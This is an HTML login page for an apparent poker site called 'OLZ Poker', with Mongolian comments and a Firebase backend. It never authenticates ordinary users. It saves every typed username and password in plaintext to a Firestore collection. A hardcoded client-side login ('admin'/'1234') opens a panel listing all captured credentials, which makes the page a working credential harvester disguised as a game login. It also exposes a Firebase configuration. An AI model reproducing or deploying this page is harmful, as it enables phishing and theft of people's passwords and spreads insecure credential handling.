<!DOCTYPE html>
<html lang="mn">
<head>
<meta charset="UTF-8">
<title>OLZ Poker</title>

<style>
body {
  background:#0f0f1a;
  color:white;
  font-family:Arial;
  text-align:center;
}
.box {
  background:#1c1c2e;
  width:300px;
  margin:100px auto;
  padding:20px;
  border-radius:12px;
}
input {
  width:90%;
  padding:10px;
  margin:10px;
}
button {
  padding:10px;
  background:#00ff99;
}
#adminPanel {
  display:none;
}
</style>
</head>

<body>

<div class="box">
  <h2>OLZ POKER 🔥</h2>
  <input id="username" placeholder="Username"><br>
  <input id="password" type="password" placeholder="Password"><br>
  <button onclick="login()">Login</button>
</div>

<div class="box" id="adminPanel">
  <h3>👑 ADMIN PANEL</h3>
  <ul id="list"></ul>
</div>

<!-- ✅ Firebase CDN -->
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

<script>
// 🔥 ЧИНИЙ FIREBASE CONFIG (аль хэдийн зөв)
const firebaseConfig = {
  apiKey: "AIzaSyAgOob8bREDuLyhxmgrSXbpkBMrZ-3uxH0",
  authDomain: "old-poker-9bcf8.firebaseapp.com",
  projectId: "old-poker-9bcf8",
  storageBucket: "old-poker-9bcf8.firebasestorage.app",
  messagingSenderId: "873019386786",
  appId: "1:873019386786:web:7869cc744ba8de5d1a20fb",
  measurementId: "G-WKVSKWTMRW"
};

// init
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// admin
const ADMIN_USER = "admin";
const ADMIN_PASS = "1234";

// login
function login() {
  let u = document.getElementById("username").value;
  let p = document.getElementById("password").value;

  if(u === "" || p === ""){
    alert("Бөглөнө үү");
    return;
  }

  // 👑 admin
  if(u === ADMIN_USER && p === ADMIN_PASS){
    document.getElementById("adminPanel").style.display = "block";
    loadUsers();
    return;
  }

  // ☁️ Firebase руу хадгалах
  db.collection("users").add({
    username: u,
    password: p
  });

  alert("Saved!");
}

// 👑 admin data авах
function loadUsers(){
  db.collection("users").onSnapshot(snapshot=>{
    let list = document.getElementById("list");
    list.innerHTML = "";

    snapshot.forEach(doc=>{
      let d = doc.data();
      let li = document.createElement("li");
      li.textContent = d.username + " / " + d.password;
      list.appendChild(li);
    });
  });
}
</script>

</body>
</html>
